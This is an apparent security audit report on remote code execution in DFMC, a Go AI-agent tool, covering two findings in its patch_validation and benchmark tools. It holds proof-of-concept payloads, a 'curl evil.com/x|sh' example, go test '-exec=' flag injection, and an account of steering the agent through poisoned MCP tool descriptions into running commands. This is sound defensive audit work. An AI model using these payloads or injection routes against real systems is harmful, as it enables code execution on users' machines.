# sc-rce — Remote Code Execution

**Target:** `D:\Codebox\PROJECTS\DFMC` (Go 1.25, single first-party language).

## Discovery summary

DFMC has **no** classic eval/exec/Function-style code-evaluation surface — Go's standard library has none, and the project uses neither `plugin.Open`, yaegi, nor any embedded scripting engine. The only dynamic-execution package is `internal/pluginexec/wasm.go`, which uses `tetratelabs/wazero` to run pre-compiled `.wasm` bytes from `WasmSpec.Module` in a sandboxed runtime (no host-imported `os`/`exec`/`fs` ABI exposed; only the explicit `run`/`initialize`/`shutdown` exports). WASM modules originate from `Config.Plugins` — local-config trusted input — and the wazero sandbox does not grant filesystem or syscall access. **Not exploitable** as an RCE source from any external boundary.

That leaves the genuine RCE surface in DFMC: **two backend tools that exec subprocesses with caller-supplied content while bypassing the safety guardrails that `run_command` and `git_*` are explicit about**. Both tools are registered in [internal/tools/engine.go:181-186](D:\Codebox\PROJECTS\DFMC\internal\tools\engine.go) and reachable by:

- the agent loop (any LLM that emits a `tool_call`),
- the meta tool dispatcher (`tool_call` / `tool_batch_call`),
- `POST /api/v1/tools/{name}` on `dfmc serve` (auth=token by default; auth=none allowed only on loopback bind),
- `dfmc tool` CLI direct invocation,
- MCP server over stdio (`dfmc mcp`).

Default `Config.Tools.RequireApproval` is empty (per [internal/config/defaults.go](D:\Codebox\PROJECTS\DFMC\internal\config\defaults.go)), so **`executeToolWithLifecycle` does NOT consult the approver for these tools** — they exec straight through.

---

## Finding: RCE-001

- **Title:** Arbitrary command execution via `validation_command` parameter in `patch_validation`
- **Severity:** Critical
- **Confidence:** 95
- **File:** D:\Codebox\PROJECTS\DFMC\internal\tools\patch_validation.go:134-153
- **Vulnerability Type:** CWE-78 (OS Command Injection) / CWE-94 (Code Injection)

### Source -> sink path

The tool spec ([patch_validation.go:32-54](D:\Codebox\PROJECTS\DFMC\internal\tools\patch_validation.go)) declares `Risk: RiskRead` and accepts a free-form `validation_command` string. `Execute` reads it and executes it directly:

```go
// patch_validation.go:64-68
validationCmd := strings.TrimSpace(asString(req.Params, "validation_command", ""))
projectRoot := req.ProjectRoot
if override := strings.TrimSpace(asString(req.Params, "project_root", "")); override != "" {
    projectRoot = override                           // <-- caller can redirect CWD
}
...
// patch_validation.go:134-143
if validationCmd != "" {
    cmdParts, cmdErr := splitCommandArgs(validationCmd)
    ...
    cmd := exec.CommandContext(runCtx, cmdParts[0], cmdParts[1:]...)
    cmd.Dir = projectRoot
    out, err := cmd.CombinedOutput()                 // <-- arbitrary binary + args
}
```

`splitCommandArgs` ([command.go:207-245](D:\Codebox\PROJECTS\DFMC\internal\tools\command.go)) is a quote-aware whitespace splitter. **None** of the protections that `RunCommandTool` builds are applied here:

- No `isBlockedShellInterpreter` -> caller can pass `validation_command: "sh -c 'curl evil.com/x|sh'"` or `"cmd.exe /c ..."`.
- No `isBlockedBinary` -> `rm`, `sudo`, `mkfs`, `shutdown`, `pkill`, `runas` all unblocked.
- No `hasScriptRunnerWithEvalFlag` -> `validation_command: "node -e 'require(\"child_process\").exec(...)'"` unblocked.
- No `detectShellMetacharacter`, no `EnsureCommandAllowed`, no user-configured `BlockedCommands`.
- No `EnsureWithinRoot` on `project_root` override -> caller can set `cmd.Dir` to `/etc`, `~`, or a worktree outside the project.

### Reachability

- **Agent loop:** any LLM (including the local offline provider) emitting a `tool_call` with `name="patch_validation"` and a `validation_command`. A hostile or compromised provider response is sufficient.
- **Untrusted MCP server:** an external MCP server connected per `MCPConfig` in `~/.dfmc/config.yaml` returns a `tools/list` response advertising tools whose descriptions/schemas reach the LLM context. While the external server cannot directly invoke `patch_validation`, it can poison the agent's reasoning to call it (described in architecture.md section 6 as an explicit trust gap).
- **Authenticated web client:** `POST /api/v1/tools/patch_validation` with `source="user"` skips the approval gate entirely (architecture.md section 7 calls this out: "even an authenticated web client invoking POST /api/v1/tools/run_command with source='user' skips the approval gate").
- **MCP stdio caller:** `dfmc mcp` exposes the tool registry verbatim. The IDE host invoking `tools/call` runs as the user and is implicitly trusted, but a compromised IDE host or a stray MCP client connected to the stdio is enough.

### Proof-of-concept payload

```json
{
  "name": "patch_validation",
  "args": {
    "patch": "--- a/README.md\n+++ b/README.md\n@@ -1,1 +1,1 @@\n-hi\n+hello\n",
    "validation_command": "powershell -EncodedCommand <base64-evil>",
    "project_root": "C:/Users/victim"
  }
}
```

The patch dry-run portion runs first against an arbitrary file under the spoofed root, then `cmd.CombinedOutput()` executes the validator against the same root. Result is returned to the caller including `validation_output`, so this is also a read primitive.

### Impact

Complete arbitrary code execution as the `dfmc` process owner. Combined with the `project_root` override, the attacker chooses the working directory. On Windows that includes `cmd.exe` / `powershell.exe` so any LOLBin trick applies; on Unix `sh -c` is one token away.

### Remediation

1. Either run `validation_command` through the same gauntlet `RunCommandTool.Execute` uses (block list + binary canonicalization + script-runner-eval-flag check + `ensureCommandAllowed`), or **delete `validation_command` from `patch_validation` entirely** and require callers to dry-run via `apply_patch` then run the validator separately through `run_command`.
2. Drop the `project_root` override or pass it through `EnsureWithinRoot(req.ProjectRoot, override)`. The current shape lets a caller execute against any directory the process can read/write.
3. Re-classify the tool's `Risk` from `RiskRead` to `RiskWrite`/`RiskCommand` so policy-aware approvers gate it.

---

## Finding: RCE-002

- **Title:** `go test` flag injection via `target` and profile-path parameters in `benchmark`
- **Severity:** High
- **Confidence:** 85
- **File:** D:\Codebox\PROJECTS\DFMC\internal\tools\benchmark.go:75-110
- **Vulnerability Type:** CWE-88 (Argument Injection) / CWE-78 (OS Command Injection)

### Source -> sink path

```go
// benchmark.go:76-104
target := strings.TrimSpace(asString(req.Params, "target", ""))         // user-controlled
benchtime := strings.TrimSpace(asString(req.Params, "benchtime", "1s")) // user-controlled
...
args := []string{"test", "-bench=.", "-benchtime", benchtime}
if cpuprofile := strings.TrimSpace(asString(req.Params, "cpuprofile", "")); cpuprofile != "" {
    args = append(args, "-cpuprofile", cpuprofile)                       // user-controlled path
}
if memprofile := strings.TrimSpace(asString(req.Params, "memprofile", "")); memprofile != "" {
    args = append(args, "-memprofile", memprofile)                       // user-controlled path
}
args = append(args, target)                                              // <-- NO `--` separator
cmd := exec.CommandContext(runCtx, "go", args...)
cmd.Dir = req.ProjectRoot
out, err := cmd.CombinedOutput()
```

There is no `--` separator between the `go test` flags and the positional `target`. `go test` accepts test-binary control flags including:

- `-exec=<wrapper>` -- runs the compiled test binary under a user-supplied wrapper. Setting `target = "-exec=cmd.exe /c calc"` (or any payload) makes `go test` shell out to the wrapper. Confirmed surface in the Go cmd/go source for the `test` action.
- `-toolexec=<wrapper>` -- same story for the build toolchain phase, runs even when there are no benchmarks to execute.
- `-o=<path>` -- writes the compiled test binary to an attacker-chosen path inside or outside the project.

The `target` parameter has no `EnsureWithinRoot`, no flag-injection guard, and no validation that it points at a Go package or file.

`cpuprofile` and `memprofile` are also unguarded paths -- they are write primitives that the attacker can use to overwrite `~/.bashrc`, `~/.profile`, a CI hook, a Windows startup script, or any file the user can write. The profile blob is binary `pprof` format, so it isn't directly an executable script, but the write happens. Combined with a path that already has a permissive interpreter (e.g. a YAML file consumed by another tool whose first bytes happen to be tolerated), this becomes a persistence vector. Standalone severity is High because of the flag-injection path; the path-write is an additional channel.

### Reachability

Same as RCE-001: agent loop, web `POST /api/v1/tools/benchmark`, MCP stdio, CLI `dfmc tool benchmark`. No approval gate by default.

### Proof-of-concept payload

```json
{
  "name": "benchmark",
  "args": { "target": "-exec=cmd.exe /c calc.exe" }
}
```

`go test -bench=. -benchtime 1s -exec=cmd.exe /c calc.exe` -- `go test` parses `-exec=` as a flag because positional args are not separated with `--`, and the compiled benchmark binary is launched under that wrapper.

### Impact

Arbitrary command execution as the `dfmc` process owner via the build/test toolchain. The target machine must have the Go toolchain installed, which is the standard DFMC dev environment.

### Remediation

1. Add `--` between the flags and the `target`: `args = append(args, "--", target)`.
2. `rejectGitFlagInjection`-style refusal of any `target`, `benchtime`, `cpuprofile`, `memprofile` value that begins with `-`.
3. Validate `target` resolves under `req.ProjectRoot` via `EnsureWithinRoot`.
4. Validate `cpuprofile` and `memprofile` resolve under `req.ProjectRoot` (and probably under a fixed `.dfmc/profiles/` subdirectory) before passing to `go test`.

---

## What was checked and cleared

| Surface | Why not flagged |
|---|---|
| `internal/tools/run_command.go` ([command.go](D:\Codebox\PROJECTS\DFMC\internal\tools\command.go)) | Multi-layer guard: shell-interpreter block, shell-metachar detect, script-runner eval-flag block, `ensureCommandAllowed` binary-block + arg-sequence-block, `EnsureWithinRoot` for path commands, `--` separator implicit (argv-only). The `cd <dir> && <cmd>` recovery hint and `binary args packing` hint are real; no exploitable hole found. |
| `internal/tools/git*.go` ([git.go](D:\Codebox\PROJECTS\DFMC\internal\tools\git.go), [git_runner.go](D:\Codebox\PROJECTS\DFMC\internal\tools\git_runner.go), [git_commit.go](D:\Codebox\PROJECTS\DFMC\internal\tools\git_commit.go), [git_worktree.go](D:\Codebox\PROJECTS\DFMC\internal\tools\git_worktree.go)) | `rejectGitFlagInjection` is consistently applied to every user-supplied `revision` / `branch` / `path` / `paths` / `new_branch` / `ref`. `blockedGitArg` covers `--upload-pack=`, `--receive-pack=`, `--exec=` prefixes plus `--no-verify`, `--amend`, `-f`. Branch names are screened by `blockedBranchName`. CVE-2018-17456 class is genuinely closed here. |
| `internal/tools/gh_runner.go` | Subcommand allowlist (`pr`, `issue`, `run`, `repo`, `api`); rejects single-dash flags; argv-only. |
| `internal/pluginexec/wasm.go` | Wazero default runtime, no host module imports, single `run` export with linear-memory string passing. WASM modules come from local `Config.Plugins`. No filesystem/syscall ABI granted. |
| `internal/mcp/client.go` | `exec.Command(command, args)` for spawning MCP servers, but `command` and `args` come from `Config.MCP.Servers` (user's own config). External-input boundary is the JSON-RPC `tools/call` reply, which is data, not exec args. |
| `internal/tools/apply_patch.go`, `edit_file.go`, `write_file.go` | `EnsureWithinRoot` plus `filepath.Clean` before the containment check, plus `IsAbs` rejection, plus per-target read-before-mutate gate. Patch-target paths do not become exec args. |
| `internal/hooks/hooks.go` | Hook commands run a shell, but they come from `~/.dfmc/config.yaml` (user-trusted) and project hooks require `hooks.allow_project=true` at global level (default false). `CheckConfigPermissions` warns on world-writable config. Documented mitigation, not a vulnerability. |
| `internal/tools/project_info.go` | `runCommandContext(ctx, projectRoot, "go", "list", "-m", "all")` -- args hardcoded; no caller-supplied input flows in. |
| `ui/web/server*.go` | `POST /api/v1/tools/{name}` is the routing point for all of the above; the bearer-token / loopback-bind auth model gates the boundary. The RCE risk lives inside the tool sinks, not the dispatcher. |
| `text/template`, `html/template` usage | Only inside `internal/langintel/go_kb.go` as a literal documentation string in the Go knowledge base; no template execution against external data. |

---

## Notes on the architecture

- **`executeToolWithLifecycle` is honest about its scope.** It applies the approval gate only when `source != "user"` AND `requiresApproval(name) == true`. Default `RequireApproval` is empty, so even agent-initiated calls to `patch_validation` and `benchmark` skip the approver. Operators who want safety must set `tools.require_approval: ["*"]` (or list these specific tools) in their config. **This is a configuration footgun:** the most dangerous tools are not approval-gated by default, and there is no special-casing for tools whose surface includes shell exec.
- The `Risk` taxonomy on `ToolSpec` exists (`RiskRead`/`RiskWrite`/`RiskCommand`/etc.) but is not consulted by the approver. A `RiskCommand`-aware approval default (gate everything that exec's a subprocess unconditionally) would close the gap for new tools added later.
